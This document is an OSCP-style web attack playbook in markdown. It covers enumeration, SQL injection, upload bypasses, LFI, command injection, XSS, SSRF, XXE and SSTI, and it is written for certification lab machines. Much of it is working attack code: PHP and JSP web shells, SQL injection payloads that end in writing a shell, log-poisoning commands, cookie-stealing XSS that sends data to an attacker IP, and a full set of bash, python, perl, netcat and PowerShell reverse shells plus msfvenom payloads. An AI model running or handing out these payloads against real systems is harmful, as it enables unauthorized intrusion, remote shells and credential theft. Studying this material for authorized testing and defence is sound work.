# Web Attacks — OSCP Playbook

A repeatable workflow: from nmap output → /etc/hosts → enumeration → vuln class → shell.
Work top-to-bottom. Don't skip steps just because the box "feels" like SQLi — most missed flags are missed because of skipped enumeration.

---

## 0. The Order of Operations (do this every time)

1. Full TCP nmap + targeted service scan.
2. Add every hostname you see to `/etc/hosts` (including all SAN entries from TLS cert).
3. Hit every web port in a browser. Note the tech stack, login forms, file upload, search fields, language, framework version.
4. View source on every page (Ctrl+U). Comments, hidden inputs, JS files, API paths, dev notes.
5. `robots.txt`, `sitemap.xml`, `.well-known/`, `crossdomain.xml`, `humans.txt`.
6. Check HTTP methods (`OPTIONS`, look for `PUT/DELETE/TRACE`).
7. whatweb / wappalyzer for tech stack → searchsploit it.
8. Directory + file fuzz (gobuster/feroxbuster/ffuf). Use extensions matched to the stack (`.php`, `.aspx`, `.jsp`, `.txt`, `.bak`, `.zip`, `.old`).
9. Vhost / subdomain fuzz against every IP that resolves.
10. Manual checks for the common bug classes (SQLi, LFI, upload, command inj, XSS, SSTI, default creds, CMS exploits).
11. Authenticate (default creds, registration, SQLi bypass) and **re-enumerate** as a logged-in user. Most upload/RCE bugs are post-auth.

---

## 1. From nmap to /etc/hosts

### Nmap commands

```bash
# Stage 1 — fast full TCP sweep
sudo nmap -p- --min-rate 5000 -T4 -oA scans/all-tcp 10.10.10.10

# Stage 2 — targeted version + default scripts on found ports
sudo nmap -sCV -p 22,80,443,8080 -oA scans/tcp-svc 10.10.10.10

# Stage 3 — vuln scripts on web ports
sudo nmap --script "http-enum,http-title,http-headers,http-methods,http-robots.txt,ssl-cert" \
  -p 80,443,8080,8443 -oA scans/http 10.10.10.10
```

What to harvest from the output:

| Output line | What it tells you | Action |
|---|---|---|
| `http-title: Did not follow redirect to http://blog.example.htb/` | Vhost in use | Add `10.10.10.10  example.htb blog.example.htb` to `/etc/hosts` |
| `Server: Apache/2.4.49` | Path traversal CVE-2021-41773 | searchsploit apache 2.4.49 |
| `X-Powered-By: PHP/5.4.16` | Old PHP → eval/`assert()`, deserialization | Note for LFI / upload |
| `WWW-Authenticate: Basic realm="..."` | HTTP basic auth | Hydra/`curl -u` after gobuster |
| `ssl-cert: Subject: CN=mail.acme.htb` <br> `Subject Alternative Name: DNS:vpn.acme.htb, DNS:dev.acme.htb` | Free vhost list | Add **all** SANs to `/etc/hosts` |
| `http-methods: PUT is enabled` | Webdav-like — upload a shell directly | `curl -X PUT --data-binary @shell.php http://target/shell.php` |
| `http-robots.txt: /admin /backup` | Hidden paths | Browse them first |

### Adding to /etc/hosts

```bash
sudo sh -c 'echo "10.10.10.10  acme.htb mail.acme.htb dev.acme.htb" >> /etc/hosts'
# verify
getent hosts acme.htb
```

Pitfall: if the site redirects to a hostname you haven't added, the browser will hang on DNS — `curl -v http://10.10.10.10` shows the `Location:` header and reveals the hostname.

```bash
curl -sI http://10.10.10.10/
# HTTP/1.1 301 Moved Permanently
# Location: http://acme.htb/
```

### Vhost / subdomain discovery

Same IP, different `Host:` header = vhost. Different results = real vhost found.

```bash
# Baseline: get a "not-found" response size
curl -sI -H "Host: doesnotexist.acme.htb" http://10.10.10.10 | grep -i content-length
# Returns e.g. 178 bytes — anything different = hit

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://10.10.10.10/ -H "Host: FUZZ.acme.htb" -fs 178

# gobuster equivalent
gobuster vhost -u http://acme.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  --append-domain --exclude-length 178
```

`-fs` / `--exclude-length` filters the baseline. Without it everything shows as a hit.

---

## 2. First-pass manual recon

Pages to always check by hand:

```
/robots.txt
/sitemap.xml
/.well-known/security.txt
/.git/HEAD          # if 200, dump it
/.svn/entries
/.env
/.DS_Store
/server-status      # apache, often "Forbidden" from outside but reachable via SSRF
/server-info
/phpinfo.php
/info.php
/test.php
/backup.zip /backup.tar.gz /site.zip
/wp-login.php /administrator /admin /login /user/login /signin
```

### .git exposed → full source

```bash
git clone https://github.com/internetwache/GitTools
GitTools/Dumper/gitdumper.sh http://target.htb/.git/ ./loot/git
cd loot/git && git log --all --oneline
git checkout <commit>      # often has plaintext creds in earlier commits
```

### View source — what to look for (do this on every page, every run)

Ctrl-U on each page and skim top-to-bottom. You're looking for **things you wouldn't see in the rendered page**.

#### HTML comments
Devs leave gold here. Search for `<!--`.
```html
<!-- TODO: remove before prod, creds admin:Welcome1 -->
<!-- old login moved to /admin-old/ -->
<!-- backup at /backup_2023.zip -->
<!-- v1.2.3 -->                    <!-- version → searchsploit -->
```

#### Hidden inputs & disabled buttons
Often reveal privilege fields or features the UI is hiding from you.
```html
<input type="hidden" name="role" value="user">         <!-- change to admin -->
<input type="hidden" name="price" value="100">         <!-- mass assignment -->
<input type="hidden" name="debug" value="0">           <!-- flip to 1 -->
<input type="hidden" name="redirect" value="/home">    <!-- open redirect / SSRF -->
<button disabled>Admin Panel</button>                  <!-- remove disabled in DevTools, see what happens -->
```

#### Meta tags
```html
<meta name="generator" content="WordPress 5.7.2">    <!-- CMS + version -->
<meta name="author" content="j.smith@acme.htb">      <!-- usernames + domain -->
<meta name="csrf-token" content="...">                <!-- framework hint (Laravel, Rails) -->
```

#### Forms — read the `action`
The form posts somewhere; that endpoint may not be linked anywhere else.
```html
<form action="/internal/api/v2/login" method="POST">  <!-- new endpoint to fuzz -->
<form enctype="multipart/form-data">                  <!-- file upload! -->
```

#### `<script src=>` — pull and grep every JS file
Most secrets live here, not in HTML.
```bash
# Mirror all JS, then grep
wget -r -l 2 -A js,map http://target.htb/ -nH -P loot/js/
cd loot/js
grep -REn 'api|token|secret|key|password|admin|bearer|aws_|firebase|jwt|debug' .
grep -REn '/v[0-9]+/|/api/|/internal/|/admin/' .
grep -REn '127\.0\.0\.1|localhost|10\.|172\.|192\.168' .
```

#### Inline JS — config objects, feature flags, role checks
```javascript
window.CONFIG = { apiKey: "AIza...", env: "dev", debug: true };
const API_BASE = "/api/v3/";
if (user.role === "admin") { /* hidden UI */ }    // shows admin endpoint names
fetch("/internal/users")                           // XHR endpoints not in HTML
```

#### Source maps — jackpot if present
If you see `//# sourceMappingURL=app.js.map` at the end of a JS file, fetch the `.map` — it contains the original (un-minified) source.
```bash
curl -s http://target.htb/js/app.js.map | jq -r '.sourcesContent[]' > app.original.js
```

#### Cookies (DevTools → Application or `curl -I`)
- `PHPSESSID` / `JSESSIONID` / `ASP.NET_SessionId` / `laravel_session` → stack ID (see §4 table)
- Missing `HttpOnly` → XSS can steal it
- Missing `Secure` on HTTPS → MITM angle (rare on OSCP)
- Cookie value looks base64 or JWT → decode it (`jwt.io`, `base64 -d`)
- Custom cookies named `role`, `user`, `is_admin` → tamper directly

#### Response headers (`curl -sI`)
```
Server: Apache/2.4.49              ← CVE candidate
X-Powered-By: PHP/5.4.16           ← old runtime
X-Debug-Token: ...                 ← Symfony profiler exposed?
X-AspNet-Version, X-AspNetMvc-Version
Location: http://internal.acme.htb ← vhost to add to /etc/hosts
WWW-Authenticate: Basic / NTLM     ← which brute path to take
```

#### Favicon hash → app fingerprint
```bash
curl -s http://target.htb/favicon.ico | md5sum
# Cross-ref against shodan favicon DB / Hunter / known-app lists.
# Identical favicon to a known CMS → that's the CMS, regardless of headers.
```

#### DevTools tabs worth a 30-second look
- **Network** — XHR/fetch endpoints the page calls that aren't in HTML (`/api/users/me`, `/internal/...`).
- **Application → Storage** — localStorage / sessionStorage often hold JWTs, API keys, full user objects with role flags.
- **Sources** — browse the JS tree; if source maps load, you see original filenames (`AdminController.ts`).
- **Console** — devs leave `console.log` of internal state, sometimes creds.

#### Quick "is anything weird" scans
```bash
# All inline comments across the site after crawling
wget -r -l 2 -np -A html http://target.htb/
grep -RoE '<!--.*?-->' . | sort -u

# Email addresses → usernames for spray
grep -RoE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' . | sort -u > emails.txt
cut -d@ -f1 emails.txt > users.txt

# All hrefs/forms/scripts for endpoint discovery
grep -RoE 'href="[^"]+"|action="[^"]+"|src="[^"]+"' . | sort -u
```

---

## 3. Directory and file fuzzing

Pick the right wordlist for the situation. SecLists is the source.

```bash
# small/fast
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt

# big/thorough
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

### feroxbuster (recursive, fast)

```bash
feroxbuster -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -x php,txt,html,bak,zip -t 50 -d 3 -o ferox.txt
```

### gobuster

```bash
gobuster dir -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,html,bak -t 50 -b 404,403 -o gob.txt

# behind basic auth
gobuster dir -u http://target.htb -U admin -P password -w ...
```

### ffuf (most flexible — use for parameter fuzzing too)

```bash
# Directories
ffuf -u http://target.htb/FUZZ -w common.txt -mc 200,204,301,302,307,401,403 -fs 0

# Files of a known extension
ffuf -u http://target.htb/FUZZ.bak -w raft-small-words.txt -mc 200

# Parameters (GET)
ffuf -u "http://target.htb/page.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs 1234      # filter the baseline response size

# Parameters (POST body)
ffuf -u http://target.htb/login -X POST -d "username=admin&password=FUZZ" -w rockyou.txt -fs 1500 \
  -H "Content-Type: application/x-www-form-urlencoded"
```

What to watch for in output:

- **200** with unusual size = real content.
- **403** = exists but blocked — try methods, try `;` / `%20` / `..;/` bypass.
- **401** = auth-protected — note it.
- **301/302** with `Location:` to interesting paths.
- A wall of identical sizes = false positive bucket — increase `-fs` filter.

### 403 bypass quick tricks

```
/admin            -> 403
/admin/           -> 200
/admin/.          -> 200
/admin..;/        -> 200    (Tomcat, Spring)
/admin%20         -> 200
/admin%09         -> 200
# headers
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
```

---

## 4. Tech-stack fingerprinting

```bash
whatweb -a 3 http://target.htb
# WordPress[5.7.2], MetaGenerator[WordPress 5.7.2], PHP[7.4.3], Apache[2.4.41]

# Manual headers
curl -sI http://target.htb
# Server, X-Powered-By, Set-Cookie (PHPSESSID, JSESSIONID, ASP.NET_SessionId, laravel_session)

# Nikto — noisy but catches low-hanging fruit
nikto -h http://target.htb -o nikto.txt
```

Cookie → stack mapping:
| Cookie | Stack | Common shell ext |
|---|---|---|
| `PHPSESSID` | PHP | `.php .phtml .phar .php5` |
| `JSESSIONID` | Java (Tomcat) | `.jsp .war` |
| `ASP.NET_SessionId` | IIS / ASP.NET | `.aspx .ashx .asp` |
| `laravel_session` | Laravel PHP | `.php` |
| `connect.sid` | Node.js | command inj via `child_process` |

Once stack is known: `searchsploit <product> <version>` and `searchsploit -m <id>` to copy.

---

## 5. SQL Injection — deep dive

### 5.1 Where to inject (this is what trips people up)

Anywhere user input reaches the backend. Test ALL of:

- **GET parameters** — `?id=1`
- **POST body** — login forms, search, comments
- **JSON body** fields — `{"username":"admin"}`
- **Cookies** — `Cookie: tracking=abc` (DB lookups based on cookie)
- **Headers**:
  - `User-Agent` (often logged to DB by analytics)
  - `Referer`
  - `X-Forwarded-For`
  - `Host` (rare but real)
- **URL path segments** — `/product/1/details` — change `1`
- **Hidden form fields** — `<input type=hidden name=order value=ASC>`
- **HTTP methods you don't think to try** — switch GET to POST or vice versa.

### 5.2 Detection — the standard probe set

For every parameter, send these one at a time and look for any change (error, different size, redirect, blank page, delay):

```
'           ← MySQL/MSSQL/Postgres → "syntax error"
"           ← string-context vs identifier
`           ← MySQL backtick
\           ← if reflected as \\ then escaped
;--+        ← comment terminator (note + = space in URL)
'--+
' OR '1'='1
' OR 1=1-- -
' OR 1=1#
') OR ('1'='1
admin'-- -
admin' OR 1=1-- -
1 AND 1=1     ← numeric context
1 AND 1=2     ← should differ
1' AND SLEEP(5)-- -          ← time-based MySQL
1; WAITFOR DELAY '0:0:5'--   ← MSSQL
1' AND pg_sleep(5)-- -       ← Postgres
```

Output to look for:

- `You have an error in your SQL syntax; check the manual that corresponds to your MySQL`
- `Warning: mysql_fetch_array() expects parameter 1`
- `Microsoft OLE DB Provider for SQL Server error`
- `ORA-01756: quoted string not properly terminated`
- HTTP 500 / blank page that didn't 500 before
- A login form that redirects to dashboard with `' OR 1=1-- -`

### 5.3 Authentication bypass payloads (login forms)

Stick these into username (and sometimes password):

```
admin'-- -
admin'#
admin'/*
' OR '1'='1'-- -
' OR '1'='1'/*
' OR 1=1 LIMIT 1-- -
") OR ("1"="1
admin' OR '1'='1
'='
```

If the app trims/strips, try `aDmIn' Or 1=1-- -`, URL-encode the quote `%27`, double-encode `%2527`.

### 5.4 UNION-based extraction (manual)

Goal: get data on the page.

1. Find column count with ORDER BY:
   ```
   ?id=1' ORDER BY 1-- -      → OK
   ?id=1' ORDER BY 5-- -      → OK
   ?id=1' ORDER BY 6-- -      → "Unknown column 6" → 5 columns
   ```
2. Find which columns reflect:
   ```
   ?id=-1' UNION SELECT 1,2,3,4,5-- -
   ```
   Page prints `2` and `4` somewhere → those are your output slots. Note the `-1` to force the original row to be empty.
3. Pull data into reflected slots:
   ```
   ?id=-1' UNION SELECT 1,user(),3,version(),5-- -
   ?id=-1' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -
   ?id=-1' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'-- -
   ?id=-1' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3,4,5 FROM users-- -
   ```

If columns must be strings: `UNION SELECT NULL,NULL,NULL-- -` and replace one NULL at a time.

### 5.5 Blind (boolean) SQLi

Page differs based on true/false but doesn't print data.

```
?id=1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
```

Script with Python or use sqlmap.

### 5.6 Blind (time-based) SQLi

```
MySQL    : ' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -
MSSQL    : '; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:5'--
Postgres : '; SELECT CASE WHEN (substr(current_database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
```

### 5.7 sqlmap — the workhorse

```bash
# Basic GET
sqlmap -u "http://target.htb/page.php?id=1" --batch --dbs

# POST data
sqlmap -u "http://target.htb/login" --data="username=admin&password=test" --batch --dbs

# Capture from Burp → file with raw request, easiest for cookies/headers/JSON
sqlmap -r req.txt --batch --dbs

# Specific param, level/risk up for harder finds
sqlmap -r req.txt -p username --level 5 --risk 3 --batch

# Header injection
sqlmap -u "http://target.htb/" --headers="X-Forwarded-For: 1*" --batch

# After --dbs:
sqlmap -r req.txt -D <dbname> --tables
sqlmap -r req.txt -D <dbname> -T users --columns
sqlmap -r req.txt -D <dbname> -T users -C username,password --dump

# RCE features (MySQL with FILE priv, MSSQL with xp_cmdshell, Postgres super)
sqlmap -r req.txt --os-shell
sqlmap -r req.txt --os-pwn        # full Metasploit hand-off
sqlmap -r req.txt --file-read=/etc/passwd
sqlmap -r req.txt --file-write=shell.php --file-dest=/var/www/html/shell.php
```

When sqlmap says "not injectable" but you're sure: try `--tamper=space2comment,between,charencode`, raise `--level`/`--risk`, give it `--dbms=mysql` to skip detection, use `-r req.txt` instead of `-u`.

### 5.8 DB-specific RCE escalation

| DB | Method |
|---|---|
| **MySQL** | `SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php'` — needs `FILE` priv + writable webroot |
| **MSSQL** | `EXEC xp_cmdshell 'whoami'` — needs sysadmin. Enable: `EXEC sp_configure 'show advanced',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` |
| **Postgres** | `COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"'` — needs super |
| **Oracle** | DBMS_SCHEDULER, DBMS_XSLPROCESSOR for file write |

---

## 6. File Upload — bypasses and shells

### 6.1 Order of bypass attempts

1. Upload a clean image with the real extension to confirm the path it goes to.
2. Upload `shell.php` raw → if blocked, note the error wording (extension vs content vs MIME).
3. Try each bypass below in turn.

### 6.2 Extension bypass

PHP gets executed by many less common extensions. Try them all:

```
shell.php
shell.php3
shell.php4
shell.php5
shell.php7
shell.phtml
shell.phar
shell.pht
shell.phps          # source disclosure only — useful for reading
```

JSP family: `shell.jsp shell.jspx shell.jsw shell.jsv shell.jspf`
ASP.NET: `shell.asp shell.aspx shell.ashx shell.asmx shell.cer shell.config`

### 6.3 Double extension

```
shell.php.jpg     # if Apache is misconfigured with AddHandler
shell.jpg.php
shell.php.        # trailing dot
shell.php%00.jpg  # null byte (old PHP < 5.3.4)
shell.php;.jpg    # IIS 6
shell.php:.jpg    # NTFS alt stream
shell.PhP         # case
shell.phtml.gif   # if blacklist only matches .php exact
```

### 6.4 MIME / Content-Type bypass

Server checks `Content-Type` header from upload form:

```
Content-Type: image/jpeg     ← change to this, keep filename shell.php
Content-Type: image/png
```

In Burp: intercept the multipart POST, edit the per-part `Content-Type` line, send.

### 6.5 Magic byte bypass

Server reads first bytes to validate it's an image:

```bash
# Prepend GIF89a header to a PHP file
printf 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.php
# Or for PNG:
printf '\x89PNG\r\n\x1a\n<?php system($_GET[0]); ?>' > shell.php
file shell.php   # → GIF image data
```

Combine: rename to `shell.php.gif` if server checks both.

### 6.6 .htaccess upload (Apache only)

If you can upload `.htaccess`, make any extension run as PHP:

```apache
AddType application/x-httpd-php .jpg
```

Then upload `shell.jpg` with PHP inside.

For nginx/PHP-FPM: try uploading `.user.ini`:
```
auto_prepend_file=shell.jpg
```

### 6.7 SVG XSS / XXE

`shell.svg`:
```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
<!-- XXE: -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>
```

### 6.8 Minimal PHP shells

One-liner web shell:
```php
<?php system($_GET['c']); ?>
```
Use: `curl 'http://target.htb/uploads/shell.php?c=id'`

Better shell — pentestmonkey reverse shell:
```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
# edit $ip and $port
```

Then start listener and hit the URL:
```bash
nc -lvnp 4444
curl http://target.htb/uploads/shell.php
```

### 6.9 ASPX shell

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```

### 6.10 JSP shell

```jsp
<%@ page import="java.util.*,java.io.*"%>
<% Runtime.getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"}); %>
```

### 6.11 Finding the upload path

After upload, you need to find where it landed. Common paths:
```
/uploads/  /upload/  /files/  /images/  /img/  /media/  /assets/uploads/
/wp-content/uploads/YYYY/MM/   ← WordPress
/user/<id>/  /avatar/
```
Burp's response to the upload often reveals the saved filename. If the name is randomized, gobuster for it: `gobuster dir -u http://target/uploads/ -w common.txt -x php`.

---

## 7. LFI / RFI / Path Traversal

### 7.1 Detection

```
?page=about              ← baseline
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd        ← filter bypass
?page=%2e%2e%2f%2e%2e%2fetc/passwd        ← URL encode
?page=..%252f..%252fetc/passwd            ← double encode
?page=/etc/passwd                          ← absolute
?page=/etc/passwd%00                       ← null byte (PHP<5.3.4)
?page=php://filter/convert.base64-encode/resource=index
```

Files to read once you have LFI (Linux):
```
/etc/passwd                       — users
/etc/hosts                        — internal hostnames
/etc/issue                        — OS version
/proc/self/environ                — env vars (sometimes injectable!)
/proc/self/cmdline                — current process
/proc/self/status
/proc/net/tcp                     — open ports (hex)
/var/log/apache2/access.log       — log poisoning target
/var/log/auth.log                 — ssh log poisoning
/home/<user>/.ssh/id_rsa          — jackpot
/home/<user>/.bash_history
/root/.ssh/id_rsa
/var/www/html/config.php          — DB creds
~/.aws/credentials
```

Windows:
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\xampp\apache\logs\access.log
C:\inetpub\logs\LogFiles\
C:\Users\<user>\.ssh\id_rsa
C:\Windows\System32\config\SAM       (locked usually)
C:\Users\<user>\NTUSER.DAT
```

### 7.2 PHP wrappers

```
php://filter/convert.base64-encode/resource=index.php
   → base64 of source code

php://filter/convert.base64-encode/resource=../config
data://text/plain,<?php system($_GET[0]);?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==
expect://id
zip://shell.zip%23shell.php
phar://upload.jpg/shell.txt
```

### 7.3 LFI → RCE

**Log poisoning (Apache)**
```bash
# 1. Inject PHP via User-Agent (logged to access.log)
curl http://target.htb/ -A '<?php system($_GET["c"]); ?>'
# 2. Include the log
curl 'http://target.htb/index.php?page=/var/log/apache2/access.log&c=id'
```

**Log poisoning (SSH)**
```bash
ssh '<?php system($_GET[0]); ?>'@target.htb   # logs to /var/log/auth.log
curl 'http://target.htb/?page=/var/log/auth.log&0=id'
```

**/proc/self/environ** — if you control User-Agent and the page reads /proc/self/environ:
```bash
curl 'http://target.htb/?page=/proc/self/environ' -A '<?php system($_GET[0]);?>'
curl 'http://target.htb/?page=/proc/self/environ&0=id'
```

**Session poisoning** — set a session value with PHP code, then include `/var/lib/php/sessions/sess_<PHPSESSID>`.

### 7.4 RFI (rare but easy)

If `allow_url_include=On`:
```
?page=http://10.10.14.5/shell.txt
# shell.txt contains <?php system($_GET[0]); ?>
# Serve with: python3 -m http.server 80
```

---

## 8. Command Injection

### 8.1 Detection chars

Append to a parameter that looks like it gets shelled out (`ping`, `nslookup`, `host`, `convert`, anything with the target's IP/URL):

```
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid       ← newline (URL encoded)
%0d%0aid
```

Linux blind:
```
; sleep 5
| sleep 5
$(sleep 5)
```

Windows:
```
& whoami
&& whoami
| whoami
```

### 8.2 Filter bypass

```
;${IFS}id              ← spaces filtered
;cat${IFS}/etc/passwd
;c'a't /etc/passwd     ← keyword filter (bash strips quotes)
;c\at /etc/passwd
;/???/c?t /etc/passwd  ← globbing for blocked binary names
;$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash)
```

### 8.3 Blind out-of-band

```bash
# Start listener
nc -lvnp 9001
# Trigger
;curl http://10.10.14.5:9001/$(whoami)
;wget http://10.10.14.5:9001/?d=$(id|base64 -w0)
;nslookup $(whoami).attacker.tld
```

---

## 9. XSS

### 9.1 Quick probes

```
<script>alert(1)</script>
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
javascript:alert(1)
'-alert(1)-'
"><iframe src=javascript:alert(1)>
"><body onload=alert(1)>
```

For each input: type unique marker like `cdtest123` and check page source where it lands. The context (HTML body, attribute, JS string, URL) tells you which payload to use.

### 9.2 Stealing cookies (admin bot levels / "report to admin" features)

```html
<script>fetch('http://10.10.14.5:8000/?c='+document.cookie)</script>
<img src=x onerror="fetch('http://10.10.14.5/?c='+btoa(document.cookie))>
```
Serve: `python3 -m http.server 8000` and watch the request log.

### 9.3 Stored XSS in file uploads

SVG (see §6.7), PDF metadata, EXIF in JPG when the app displays it.

### 9.4 BeEF / session hijack via cookie value

Once you have the admin cookie, set it in your browser (DevTools → Application → Cookies) and refresh.

---

## 10. SSRF

Look for any parameter that fetches a URL: `?url=`, `?image=`, `?fetch=`, `?callback=`, webhook fields, "import from URL", PDF generators.

```
?url=http://127.0.0.1/
?url=http://localhost:8080/
?url=http://169.254.169.254/latest/meta-data/   ← AWS IMDS
?url=http://[::1]/
?url=file:///etc/passwd
?url=gopher://127.0.0.1:6379/_INFO              ← Redis
?url=dict://127.0.0.1:11211/stats               ← memcache
```

Common SSRF → RCE chains:
- Internal Jenkins / Tomcat manager → deploy WAR.
- Internal Redis → write SSH key into authorized_keys via CONFIG SET.
- Cloud metadata → IAM creds.

---

## 11. XXE

Anywhere you POST XML (SAML, SOAP, RSS imports, SVG, DOCX):

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- PHP filter for binary files -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">

<!-- Out-of-band -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.14.5/x.dtd"> %xxe;]>
```

---

## 12. SSTI

Templates evaluate user input. Probe with `{{7*7}}` (Jinja, Twig), `${7*7}` (Freemarker), `<%= 7*7 %>` (ERB), `#{7*7}` (Ruby).

```
{{7*7}}                → 49 means Jinja/Twig
{{7*'7'}}              → 7777777 = Jinja, 49 = Twig
${{<%[%'"}}%\          → identifier probe

# Jinja2 → RCE
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}    ← find the right index for subprocess.Popen
```

---

## 13. CMS-specific

### WordPress

```bash
wpscan --url http://target.htb -e u,vp,vt --plugins-detection aggressive
# user enum (-e u), vulnerable plugins (vp), themes (vt)

# Brute force a found user (only if you have a wordlist of likely passwords)
wpscan --url http://target.htb -U admin -P /usr/share/wordlists/rockyou.txt

# Once logged in as admin → RCE via plugin upload, theme editor, or 404.php edit
# Replace 404.php with PHP reverse shell, then visit /wp-content/themes/twentytwenty/404.php
```

### Joomla

```bash
joomscan -u http://target.htb
# Default admin path: /administrator
# RCE via template manager (logged in admin)
```

### Drupal

`?q=node/1`, look at META for version. Drupalgeddon (CVE-2018-7600, 2019-6340) is one-shot RCE for vulnerable versions.

```bash
searchsploit drupal
```

---

## 14. Reverse shell payloads (drop-ins)

Always:
```bash
# attacker
nc -lvnp 4444
# or for upgrade-friendly
rlwrap nc -lvnp 4444
```

### Linux

```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196

# python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'

# perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# nc (mkfifo when -e missing)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f

# php (one-liner)
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Windows

```powershell
# powershell base64 cradle — use revshells.com to encode
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Stabilize shell (Linux)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
export TERM=xterm
# now you have arrow keys, Ctrl-C, tab completion
```

### msfvenom one-liners

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
```

---

## 15. Default creds — try first, every time

```
admin:admin
admin:password
admin:admin123
root:root
tomcat:tomcat        /manager/html
tomcat:s3cret
jenkins:jenkins
guest:guest
test:test
user:user
weblogic:weblogic
sa:sa                 (MSSQL)
postgres:postgres
oracle:oracle
```

Tomcat manager: hit `/manager/html`, on success upload a WAR (§14).
Jenkins: `/script` console — `Runtime.getRuntime().exec(...)`.
phpMyAdmin: SQL → `SELECT '<?php ...' INTO OUTFILE`.

---

## 16. Burp Suite quick patterns

- **Intruder Sniper** for single-param fuzzing (sqli probes, username enum).
- **Intruder Cluster bomb** for cred brute (user × pass).
- **Repeater** for crafting one-off requests — save the original, then mutate.
- **Comparer** for two responses to spot blind injection diffs.
- **Match and Replace** in Proxy → Options for persistent `X-Forwarded-For` injection.
- Save raw request to file → `sqlmap -r req.txt` (best way to pass cookies/headers/POST).

---

## 17. Useful wordlists (Kali paths)

```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
